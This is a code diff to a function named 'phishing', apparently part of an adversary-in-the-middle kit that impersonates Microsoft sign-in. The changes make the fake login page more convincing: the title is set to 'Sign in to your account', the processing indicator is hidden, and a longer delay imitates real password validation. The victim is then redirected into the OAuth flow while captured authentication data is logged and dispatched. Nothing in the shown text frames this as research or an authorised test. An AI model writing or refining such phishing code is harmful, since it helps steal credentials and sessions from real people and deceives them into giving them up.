@@ -364,16 +364,18 @@ app.http("phishing", {
           // Log the response data to console for debugging
           dispatchMessage(`🔐 PASSWORD BYPASS SUCCESS: ${JSON.stringify(responseData)}`);
           
-          // Return HTML that auto-continues the flow instead of showing JSON
+          // Instead of showing a loading page, simulate a longer password processing time
+          // then automatically continue the flow - more authentic to real MS login
           mockResponse = `
             <html>
             <head>
-              <title>Processing Authentication...</title>
+              <title>Sign in to your account</title>
               <script>
-                // Log the response for debugging
+                // Log the response for debugging (hidden from user)
                 console.log('🎯 AITM PASSWORD BYPASS SUCCESS:', ${JSON.stringify(responseData)});
                 
-                // Auto-continue the OAuth flow
+                // Simulate authentic Microsoft login processing time (3-5 seconds)
+                // This makes it look like the server is actually validating the password
                 setTimeout(function() {
                   // Extract current URL parameters
                   const urlParams = new URLSearchParams(window.location.search);
@@ -388,21 +390,14 @@ app.http("phishing", {
                   
                   console.log('🔄 AUTO-REDIRECTING TO OAUTH:', oauthUrl);
                   window.location.href = oauthUrl;
-                }, 1000);
+                }, 3500); // 3.5 second delay to simulate real password processing
               </script>
             </head>
-            <body>
-              <div style="text-align: center; font-family: Arial; margin-top: 100px;">
-                <h2>Completing authentication...</h2>
-                <p>Please wait while we process your login.</p>
-                <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto;"></div>
+            <body style="margin: 0; padding: 0;">
+              <!-- Invisible processing - user just sees the password page "thinking" longer -->
+              <div style="display: none;">
+                Authentication processing...
               </div>
-              <style>
-                @keyframes spin {
-                  0% { transform: rotate(0deg); }
-                  100% { transform: rotate(360deg); }
-                }
-              </style>
             </body>
             </html>
           `;
